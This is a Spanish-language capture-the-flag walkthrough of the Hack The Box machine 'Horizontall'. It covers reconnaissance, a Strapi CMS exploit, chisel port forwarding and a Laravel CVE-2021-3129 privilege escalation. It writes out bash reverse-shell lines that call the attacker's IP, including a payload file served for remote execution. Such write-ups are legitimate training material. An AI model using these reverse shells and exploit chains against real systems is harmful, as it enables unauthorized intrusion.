# Horizontall

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: Information Leakage /
Port Forwarding /
Strapi CMS Exploitation /
Laravel Exploitation

Te prepara para las **Certificaciones**: eWPT / 
eJPT<br><br>

![image](https://github.com/user-attachments/assets/af9a9961-73a8-482e-9483-ec5ac1a6995a)<br><br>


# Reconocimiento

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/aa23cc88-f9cf-4929-9913-555a8cd3d575)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>


Utilizando `gobuster` encontramos un subdominio `api-prod.horizontall.htb`<br>

![image](https://github.com/user-attachments/assets/bceae454-e614-4ea9-a6da-7f28b16cad69)<br>

- `vhost` ->  Buscar Subdominios
- `-u` -> Indicar URL
- `-w` ->  Indicar diccionario que voy a utilizar
- `-t` -> Numero de hilos que voy a usar
- `--apend-domain` Para que funcione <br><br>


Ponemos el subdominio, y el dominio en `/etc/hosts`<br>

![image](https://github.com/user-attachments/assets/ee8ee5c8-726c-4c46-90c2-d313bafa0ab2)<br><br>



Utilizando `gobuster` encontramos directorios en el subdominio, en `admin` nos lleva al panel de `strapi`<br>

![image](https://github.com/user-attachments/assets/7c5ca97f-6267-4ec3-b44f-18f6fa5fa898)<br><br>


Utilizando `searchsploit` vemos una vulnerabilidad <br>

![image](https://github.com/user-attachments/assets/a915141f-c94d-4e43-a60a-f4eb034f99a6)<br><br>

# Explotación

Nos traemos este exploit<br>

![image](https://github.com/user-attachments/assets/347a27ad-7d73-4fe6-9e02-6e9f21617887)<br><br>


Lo explotamos con `python3` y nos da una consola.<br>

![image](https://github.com/user-attachments/assets/2faac99a-fe79-4d46-8353-431b4f091b07)<br><br>


Enviándonos una bash a nuestra ip por el puerto 443 `bash -c 'bash -i >& /dev/tcp/10.10.14.55/443 0>&1'` Ganamos acceso a la maquina.<br>

![image](https://github.com/user-attachments/assets/0e1e6ebe-d24b-4b96-bb80-a35371fedbf8)<br><br>


# Escalada de privilegios

Flag del usuario:<br>
![image](https://github.com/user-attachments/assets/4b6f34c1-9616-4f00-b971-f47a4275e144)<br><br>


Utilizando `curl` hacemos un: `curl http://localhost:8000` y vemos el "Laravel" vulnerable <br>

![image](https://github.com/user-attachments/assets/605191aa-d9e1-41ee-9aab-9829560027b8)<br><br>


Nos descargamos `chisel`, buscando la version 1.5:
https://github.com/jpillora/chisel<br>


Abrimos el puerto 80:
`python -m http.server 80`<br>


Descargamos `chisel` en la maquina  victima<br>

![image](https://github.com/user-attachments/assets/587b86d2-a600-4918-bbad-e17546867e1d)<br><br>


Abrimos el puerto 1234 con `chisel`<br>

![image](https://github.com/user-attachments/assets/ed8211a2-ad15-41ef-877c-cf1e74e48515)<br><br>


Hacemos nuestro puerto 8000 sea el puerto 8000 de la maquina victima:<br>

![image](https://github.com/user-attachments/assets/23ff05c6-fdf6-4d4a-be45-493836bea0df)<br><br>


Exploit para el Laravel

https://github.com/nth347/CVE-2021-3129_exploit<br>

Utilizando el Exploit abrimos el index.html y  lo interpretamos con bash (debemos estar escuchando por el puerto 443 y hacer `python3 -m htt.server 80` para compartir ese index.html)<br>

![image](https://github.com/user-attachments/assets/b3df619b-6863-4b8a-9cf3-6433437897ba)<br><br>

index.html<br>
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.55/443 0>&1

```
<br>

Flag Final:<br>
![image](https://github.com/user-attachments/assets/54f92dd5-895d-4f9e-9417-ba9015b6f2a7)<br><br>

